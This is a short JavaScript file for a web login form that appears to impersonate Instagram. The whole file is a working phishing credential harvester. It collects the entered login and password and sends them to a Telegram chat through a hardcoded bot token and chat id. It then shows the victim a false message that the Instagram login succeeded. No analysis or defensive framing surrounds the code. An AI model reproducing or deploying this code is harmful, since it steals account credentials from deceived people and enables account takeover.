function integrationTG(e) {
  e.preventDefault();

  let text1 = document.querySelector(".text1").value;
  let text2 = document.querySelector(".text2").value;
  let alertBox = document.getElementById("alertBox");

  if (!text1 || !text2) {
    showAlert("Please fill in both fields.");
    return;
  }

  let message = encodeURIComponent("Login:  " + text1 + " \n" + "Password:  " + text2);
  let chat_id = "7538330099";
  let token = "6935136578:AAFCN4TR5wgNkmPsegaGqIAOIpkuE64sJW4";
  let urlpi = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;

  axios
    .post(urlpi)
    .then((res) => {
      showAlert("You logged in to Instagram successfully.", "success");
      clearInputFields();
    })
    .catch((error) => {
      console.log(error);
      showAlert("Error sending message. Please try again.", "error");
    });
}

function showAlert(message, type = "error") {
  let alertBox = document.getElementById("alertBox");
  alertBox.textContent = message;
  alertBox.style.display = "block";
  alertBox.style.color = type === "success" ? "green" : "red";

  setTimeout(() => {
    alertBox.style.display = "none";
  }, 2000);
}

function clearInputFields() {
  document.querySelector(".text1").value = "";
  document.querySelector(".text2").value = "";
}

document.querySelector(".text2").addEventListener("keypress", function (event) {
  if (event.key === "Enter") {
    integrationTG(event);
  }
});

document.querySelector(".submit-button").addEventListener("click", function (event) {
  integrationTG(event);
});
